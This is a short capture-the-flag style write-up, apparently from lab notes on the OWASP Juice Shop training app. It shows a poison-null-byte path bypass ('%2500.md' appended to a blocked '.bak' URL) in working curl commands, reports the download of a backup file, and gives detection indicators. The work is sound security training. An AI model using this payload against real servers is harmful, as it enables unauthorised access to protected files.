---
title: "Juice Shop · 02 · Poison-Null-Byte /ftp bypass"
tags: [juiceshop, access-control, path-traversal, exfil]
verdict: confirmed
cwe: [CWE-22, CWE-158]
---

# 02 · Poison-Null-Byte `/ftp` bypass — 🟢 F2 confirmed

The `/ftp` static handler blocks non-whitelisted extensions (`.bak`, `.kdbx`, …) but resolves the path *before* the null byte, so `…%2500.md` satisfies the `.md` allow-list while serving the real `.bak`.

## Commands

```bash
# direct download — blocked by extension filter
curl -s -o /dev/null -w "%{http_code}\n" 'http://localhost:3000/ftp/package-lock.json.bak'      # 403

# Poison Null Byte (%00 url-encoded as %2500 through the proxy) + fake .md
curl -s -o package-lock.json -w "%{http_code}\n" \
  'http://localhost:3000/ftp/package-lock.json.bak%2500.md'                                      # 200
```

## Result

- Direct `.bak` → **403**; `…%2500.md` → **200**. Extension allow-list bypassed (CWE-22 path handling + CWE-158 null byte).
- Exfiltrated **`package-lock.json.bak`** — 750,353 bytes, a legacy `"version":"6.2.0-SNAPSHOT"` manifest (1,458 packages).
- Same technique applies to `incident-support.kdbx`, `coupons_2013.md.bak`, `package.json.bak`.

## Next

- Leaked lockfile → dependency SCA → [[juiceshop-03-sca-dependencies]].
- IOC for the SOC: `%2500` / null byte in `/ftp` URIs, and a **403→200 flip** on the same path.
